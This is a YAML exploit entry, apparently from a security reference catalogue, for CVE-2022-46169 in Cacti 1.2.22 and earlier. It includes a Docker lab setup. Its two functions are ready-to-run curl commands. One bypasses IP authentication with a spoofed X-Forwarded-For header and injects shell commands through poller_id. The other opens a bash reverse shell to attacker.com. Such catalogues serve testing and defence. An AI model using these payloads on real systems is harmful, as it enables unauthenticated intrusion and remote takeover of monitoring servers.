---
comment: |
  Cacti is an open-source network monitoring and graphing solution. CVE-2022-46169
  chains an authentication bypass with a command injection vulnerability in
  remote_agent.php. The endpoint validates the caller's IP against the Cacti
  database; the X-Forwarded-For header bypasses this check. The poller_id
  parameter is appended unsanitized to a shell command string passed to proc_open.
  Affects Cacti <= 1.2.22. Listed in the CISA KEV catalog.
docker:
  compose: "services:\n  cacti:\n    image: vulhub/cacti:1.2.22\n    ports:\n    \
    \  - \"8080:80\"\n    depends_on:\n      - db\n    environment:\n      DB_HOST:\
    \ db\n      DB_USER: cacti\n      DB_PASS: cacti\n      DB_NAME: cacti\n  db:\n\
    \    image: mysql:5.7\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n   \
    \   MYSQL_DATABASE: cacti\n      MYSQL_USER: cacti\n      MYSQL_PASSWORD: cacti\n"
  note: "Uses the Vulhub lab image for CVE-2022-46169 (Cacti 1.2.22 + MySQL 5.7).\n\
    Access Cacti at `http://localhost:8080`. Default credentials: `admin` / `admin`.\n\
    After first login, add a device (e.g. localhost / 127.0.0.1) so that `host_id=1`\n\
    and `local_data_ids[0]=1` exist in the database \u2014 required for the injection\
    \ to fire.\nRun `docker compose up -d && sleep 30` to give the DB time to initialise\
    \ before browsing.\n"
functions:
  rce:
  - code: |
      # Enumerate valid host_id and local_data_ids values (increment if first attempt fails)
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;id" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: |
      CVE-2022-46169: the poller_id GET parameter in remote_agent.php is concatenated
      into a shell command string without sanitization, then passed to proc_open.
      The X-Forwarded-For header spoofs the client IP as 127.0.0.1, satisfying the
      IP-based authentication check that restricts access to trusted Cacti servers.

      host_id and local_data_ids[0] must reference an existing monitored host and its
      associated data source in the Cacti database. Default installs with at least one
      monitored device typically have host_id=1 and local_data_ids[0]=1. Increment
      both values (1, 2, 3...) if the initial attempt returns no output.

      Command output is returned inline in the HTTP response body.
      Ref: https://www.exploit-db.com/exploits/51166
    contexts:
      unauthenticated:
    version: |-
      <= 1.2.22
  reverse-shell:
  - blind: true
    code: |
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: |
      CVE-2022-46169: spawns a reverse bash shell via the poller_id command injection.
      The trailing & detaches the shell from the process group so the HTTP request
      completes normally. The shell runs as the web server user (www-data, apache, or cacti).
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |-
      <= 1.2.22
...
